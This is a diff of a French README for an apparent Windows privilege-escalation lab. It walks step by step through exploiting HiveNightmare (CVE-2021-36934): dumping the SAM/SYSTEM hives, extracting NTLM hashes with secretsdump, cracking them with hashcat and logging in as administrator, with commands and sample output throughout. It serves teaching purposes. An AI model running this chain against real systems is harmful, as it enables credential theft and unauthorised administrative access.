@@ -1,8 +1,18 @@
-# Laboratoire d'Escalade de Privilèges : Fichiers Windows Unattended
+# Laboratoire d'Escalade de Privilèges Windows
 
 ## Vue d'Ensemble du Projet
 
-Ce laboratoire démontre une technique courante d'escalade de privilèges sur Windows. Il consiste à localiser des fichiers d'installation automatisée (Unattend.xml), extraire des identifiants administratifs encodés à l'aide de Python/Regex, et établir une session administrative pour récupérer un flag cible.
+Ce laboratoire démontre deux techniques d'escalade de privilèges sur Windows :
+- **Task 0** : Exploitation de fichiers d'installation automatisée (Unattend.xml) contenant des identifiants encodés en Base64
+- **Task 1** : Exploitation de la vulnérabilité HiveNightmare (CVE-2021-36934) pour extraire et cracker les hashes SAM/SYSTEM
+
+---
+
+# TASK 0 : Privilege Escalation via Unattended Files
+
+## Objectif
+
+Localiser des fichiers d'installation automatisée (Unattend.xml), extraire des identifiants administratifs encodés à l'aide de Python/Regex, et établir une session administrative pour récupérer un flag cible.
 
 ---
 
@@ -126,69 +136,179 @@ Exploiter une vulnérabilité du système pour récupérer le mot de passe du co
 
 ---
 
-## Étape 1 : Énumération des Privilèges
+## Étape 1 : Vérification de la Vulnérabilité
 
-Télécharger et exécuter le script PowerShell **PrivCheck** sur le système cible pour identifier les vulnérabilités.
+Vérifier si les fichiers SAM/SYSTEM sont accessibles en lecture par les utilisateurs standards (vulnérabilité HiveNightmare/SeriousSAM).
+
+**Commande utilisée :**
+```cmd
+icacls C:\Windows\System32\config\SAM
+```
+
+**Vulnérable si la sortie contient :**
+```
+BUILTIN\Users:(I)(RX)
+```
+
+Cela signifie que les utilisateurs standards ont des permissions de lecture sur le fichier SAM, ce qui est une faille de sécurité.
+
+---
+
+## Étape 2 : Énumération des Privilèges (Optionnel)
+
+Télécharger et exécuter le script PowerShell **PrivCheck** sur le système cible pour identifier d'autres vulnérabilités potentielles.
 
 **Analyse de la sortie :**
-- Identifier la vulnérabilité liée aux fichiers de sauvegarde SAM et SYSTEM
+- Confirmer la vulnérabilité HiveNightmare
 - Repérer les chemins d'accès aux fichiers sensibles
+- Identifier les copies shadow disponibles
 
 ---
 
-## Étape 2 : Recherche et Exploitation
+## Étape 3 : Exploitation avec HiveNightmare
 
-**Recherche :**
-- Rechercher en ligne la vulnérabilité identifiée
-- Localiser et télécharger un exploit fonctionnel (fichier `.exe`)
+Utiliser l'exploit **HiveNightmare.exe** pour extraire les fichiers critiques depuis les copies shadow du système.
 
-**Exploitation :**
-- Utiliser l'exploit pour extraire les fichiers critiques du système cible (SAM et SYSTEM)
+**Téléchargement :**
+- Rechercher et télécharger un exploit HiveNightmare fonctionnel (fichier `.exe`)
+- Transférer l'exploit sur la VM cible
+
+**Exécution :**
+```cmd
+HiveNightmare.exe
+```
+
+**Fichiers extraits :**
+- `SAM-*` (base de données des comptes utilisateurs)
+- `SYSTEM-*` (clés de chiffrement)
+- `SECURITY-*` (politiques de sécurité)
 
 ---
 
-## Étape 3 : Extraction des Hashes
+## Étape 4 : Transfert des Fichiers vers Kali Linux
+
+Transférer les fichiers extraits (SAM, SYSTEM, SECURITY) depuis la VM Windows vers Kali Linux.
+
+**Méthodes possibles :**
+- Partage réseau (SMB)
+- Serveur HTTP Python : `python -m http.server 8000`
+- Copie via SSH/SCP
+- Clé USB partagée dans VirtualBox
+
+---
+
+## Étape 5 : Extraction des Hashes NTLM
 
 **Sur Kali Linux :**
 
-1. S'assurer que le toolkit **Impacket** est installé
-2. Utiliser l'outil `secretsdump.py` pour extraire les hashes de mots de passe à partir des fichiers SAM et SYSTEM
-
-**Commande exemple :**
+S'assurer que le toolkit **Impacket** est installé :
 ```bash
-secretsdump.py -sam SAM -system SYSTEM LOCAL
+sudo apt install impacket-scripts
 ```
+
+Extraire les hashes de mots de passe à partir des fichiers SAM/SYSTEM/SECURITY :
+
+**Commande :**
+```bash
+impacket-secretsdump -sam SAM-* -system SYSTEM-* -security SECURITY-* LOCAL
+```
+
+**Sortie attendue :**
+```
+[*] Target system bootKey: 0x...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+superAdministrator:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+```
+
+**Hash NTLM récupéré :** `13b29964cc2480b4ef454c59562e675c`
 
 ---
 
-## Étape 4 : Accès Session Administrateur
+## Étape 6 : Cracking du Hash NTLM
 
-**Méthode PowerShell avec Credentials :**
+Utiliser **hashcat** pour cracker le hash NTLM et récupérer le mot de passe en clair.
 
-Utiliser PowerShell pour exécuter des commandes en tant que `superAdministrator` et copier les fichiers protégés vers un emplacement accessible.
+**Commande :**
+```bash
+hashcat -m 1000 13b29964cc2480b4ef454c59562e675c /usr/share/wordlists/rockyou.txt
+```
+
+**Paramètres :**
+- `-m 1000` : Mode NTLM
+- Hash à cracker
+- Dictionnaire rockyou.txt
+
+**Résultat :**
+```
+13b29964cc2480b4ef454c59562e675c:P@ssword
+```
+
+**Mot de passe cracké :** `P@ssword`
+
+---
+
+## Étape 7 : Accès Session Administrateur
+
+### Méthode 1 : Connexion RDP
+
+Se connecter en RDP avec le mot de passe récupéré :
+
+```bash
+xfreerdp3 /u:Administrator /p:P@ssword /v:<IP_LAB02>
+```
+
+ou
+
+```bash
+xfreerdp3 /u:superAdministrator /p:P@ssword /v:<IP_LAB02>
+```
+
+### Méthode 2 : PowerShell avec Credentials (depuis Sammy)
+
+Utiliser PowerShell pour exécuter des commandes en tant que `superAdministrator` et copier les fichiers protégés :
 
 ```powershell
 $password = ConvertTo-SecureString "P@ssword" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("superAdministrator", $password)
+
+# Copier les fichiers du bureau de superAdministrator vers le dossier Public
 Start-Process "cmd.exe" -ArgumentList "/c copy C:\Users\superAdministrator\Desktop\* C:\Users\Public\" -Credential $cred
+
+# Attendre que la copie se fasse
 Start-Sleep -s 2
+
+# Lister le dossier Public pour voir le flag
 ls C:\Users\Public\
 ```
 
-**Récupération du flag :**
-- Ouvrir une session administrateur en utilisant les hashes récupérés
-- Localiser et récupérer le flag
-- Sauvegarder le flag dans `1-flag.txt`
+---
+
+## Étape 8 : Récupération du Flag
+
+**Sur le bureau de superAdministrator :**
+
+Lancer le programme flag.exe :
+```cmd
+C:\Users\superAdministrator\Desktop\flag.exe
+```
+
+**Sauvegarder le flag :**
+- Copier le flag affiché
+- Sauvegarder dans `1-flag.txt`
 
 ---
 
 ## Conclusion Task 1
 
-L'exploitation des fichiers de sauvegarde SAM et SYSTEM permet d'extraire les hashes de mots de passe et d'obtenir un accès administrateur. Cette technique démontre l'importance de protéger les fichiers système sensibles.
+L'exploitation des fichiers de sauvegarde SAM et SYSTEM via la vulnérabilité HiveNightmare permet d'extraire les hashes de mots de passe, de les cracker, et d'obtenir un accès administrateur complet au système.
 
 ### Leçons Apprises
 
-- Les fichiers SAM et SYSTEM contiennent des informations critiques pour l'authentification Windows
-- L'outil `secretsdump.py` d'Impacket est efficace pour extraire les hashes
-- PowerShell permet d'exécuter des commandes avec des credentials spécifiques
-- Les fichiers de sauvegarde non protégés représentent un risque de sécurité majeur
+- La vulnérabilité HiveNightmare (CVE-2021-36934) permet aux utilisateurs standards d'accéder aux fichiers SAM/SYSTEM
+- Les copies shadow du système peuvent contenir des informations sensibles
+- L'outil `impacket-secretsdump` est efficace pour extraire les hashes depuis les fichiers Windows
+- Hashcat avec le dictionnaire rockyou.txt peut cracker des mots de passe faibles
+- Les hashes NTLM peuvent être crackés ou utilisés directement (Pass-the-Hash)
+- PowerShell permet d'exécuter des commandes avec des credentials spécifiques sans session interactive
